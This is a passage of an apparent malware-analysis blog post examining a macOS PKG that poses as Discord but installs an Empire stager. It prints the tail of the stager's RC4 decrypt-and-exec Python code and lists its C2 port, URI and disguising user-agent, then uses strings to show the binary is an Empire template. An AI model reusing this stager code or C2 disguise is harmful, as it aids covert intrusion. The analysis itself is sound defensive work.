    <span class="nv">j</span><span class="o">=(</span>j+S[i]<span class="o">)</span>%256
    S[i],S[j]<span class="o">=</span>S[j],S[i]
    out.append<span class="o">(</span>chr<span class="o">(</span>ord<span class="o">(</span>char<span class="o">)</span>^S[<span class="o">(</span>S[i]+S[j]<span class="o">)</span>%256]<span class="o">))</span>
<span class="nb">exec</span><span class="o">(</span><span class="s1">''</span>.join<span class="o">(</span>out<span class="o">))</span>
</pre></table></code></div></div><p>While inspecting the Python code, we can note a few things for leads. First, the C2 server for this implant is at 176.126.70.xxx (intentionally redacted) on port 10001 listening for the HTTP protocol. When visiting the C2 server for commands, the code will request a URI path of <code class="language-plaintext highlighter-rouge">/login/process.php</code> using a user-agent string of <code class="language-plaintext highlighter-rouge">Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</code>. Both of these details help Empire’s network traffic masquerade as legitimate traffic in an enterprise network.</p><p>With this cleartext code, we can easily attribute the code to Empire with code publicly available on GitHub. In this case, the Python code comes from this file in the former, archived Empire repository: <a href="https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L413">https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L413</a>.</p><p>The PKG stager packaging is also in the repository here: <a href="https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py#L404">https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py#L404</a>.</p><h2 id="does-the-app-even-do-anything"><span class="mr-2">Does The App Even Do Anything?</span><a href="#does-the-app-even-do-anything" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>From here we’re certain the PKG file contains an Empire stager, but it could also potentially contain legitimate functionality related to Discord. We can rule that out by investigating the rest of the PKG contents.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd </span>Applications/Discord.app/
<span class="nv">$ </span>tree <span class="nt">-a</span>
<span class="nb">.</span>
└── Contents
    ├── _CodeSignature
    │   └── CodeResources
    ├── Info.plist
    ├── MacOS
    │   └── Discord
    ├── PkgInfo
    └── Resources
        ├── Base.lproj
        │   └── MainMenu.nib
        └── Scatter.icns

5 directories, 6 files
</pre></table></code></div></div><p>Using the <code class="language-plaintext highlighter-rouge">tree</code> command, we can inspect the folder structure without all the laborious <code class="language-plaintext highlighter-rouge">ls</code> commands. Within macOS application bundles, the main executable of interest typically lives in the Contents/MacOS folder. In this case, it’s named Discord.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd </span>Contents/MacOS/
<span class="nv">$ </span>file Discord 
Discord: Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
</pre></table></code></div></div><p>From the output of <code class="language-plaintext highlighter-rouge">file</code> we know that Discord is definitely a Mach-O executable binary. We’re not going to fully reverse the binary, but we can get some additional evidence by simply running <code class="language-plaintext highlighter-rouge">strings</code> to see if we can identify suspicious binary contents. First, we’ll run <code class="language-plaintext highlighter-rouge">strings</code> to get standard ASCII characters into a file. Then, we’ll re-run <code class="language-plaintext highlighter-rouge">strings</code> again, targeting the Unicode characters.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings Discord <span class="o">&gt;</span> discord.strings.txt
<span class="nv">$ </span>strings <span class="nt">-el</span> Discord <span class="o">&gt;&gt;</span> discord.strings.txt 

<span class="nv">$ </span>less discord.strings.txt

__PAGEZERO
__TEXT
__text
__TEXT
__const
__TEXT
__unwind_info
__TEXT
__DATA
__objc_imageinfo__DATA
__LINKEDIT
/usr/lib/dyld
/System/Library/Frameworks/Python.framework/Versions/2.7/Python
/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
/usr/lib/libobjc.A.dylib
/usr/lib/libSystem.B.dylib
@<span class="o">(</span><span class="c">#)PROGRAM:templateMachoExe  PROJECT:templateMachoExe-</span>
_mh_execute_header
:main
<span class="o">&gt;</span>templateMachoExeVersion
String
UNumber
__mh_execute_header
_main
_templateMachoExeVersionNumber
_templateMachoExeVersionString
dyld_stub_binder
templateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24d
PC^t
templateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24d
@DxG
</pre></table></code></div></div><p>It’s not common to see a functional binary quite this lean in strings. In fact, there doesn’t appear to be anything in the binary specifically relevant to Discord in any way. An additional lead to investigate is the string <code class="language-plaintext highlighter-rouge">templateMachoExe</code> present in the <code class="language-plaintext highlighter-rouge">strings</code> output. This string could indicate the binary is a generic copy of the template Mach-O file contained with Empire. To find out for sure, you can download the <a href="https://github.com/EmpireProject/Empire/blob/master/data/misc/machotemplate">template file</a> and run <code class="language-plaintext highlighter-rouge">strings</code> against it to compare the output.</p><p>Hopefully this helps illustrate how Empire stagers work on macOS, thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>Malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/macos/" class="post-tag no-text-decoration" >macOS</a> <a href="/tags/empire/" class="post-tag no-text-decoration" >Empire</a> <a href="/tags/pkg/" class="post-tag no-text-decoration" >PKG</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Analyzing an Empire macOS PKG Stager - Tony Lambert&amp;url=https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Analyzing an Empire macOS PKG Stager - Tony Lambert&amp;u=https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/&amp;text=Analyzing an Empire macOS PKG Stager - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/formbook-via-vbs-powershell-and-csharp/"><div class="card-body"> <em class="timeago small" data-ts="1648166400" > 2022-03-25 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Formbook Distributed Via VBScript, PowerShell, and C# Code</h3><div class="text-muted small"><p> Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbo...</p></div></div></a></div><div class="card"> <a href="/agenttesla-vba-certutil-download/"><div class="card-body"> <em class="timeago small" data-ts="1648252800" > 2022-03-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>An AgentTesla Sample Using VBA Macros and Certutil</h3><div class="text-muted small"><p> AgentTesla is a .NET stealer that adversaries commonly buy and combine with other malicious products for deployment. In this post I’m tearing into a XLSM document that downloads and executes furthe...</p></div></div></a></div><div class="card"> <a href="/snip3-crypter-dcrat-vbs/"><div class="card-body"> <em class="timeago small" data-ts="1650067200" > 2022-04-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Snip3 Crypter used with DCRat via VBScript</h3><div class="text-muted small"><p> Adversaries love using free or cheap RATs or stealers, and I see a lot of RATs such as AsyncRAT during my daily malware analysis tasks. In this detection I want to examine a fairly recent sample fr...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/how-qbot-uses-esentutl/" class="btn btn-outline-primary" prompt="Older"><p>How Qbot Uses Esentutl</p></a> <a href="/extracting-sfx-installer/" class="btn btn-outline-primary" prompt="Newer"><p>Extracting Malicious Payloads from SFX Self-Extracting Installers</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
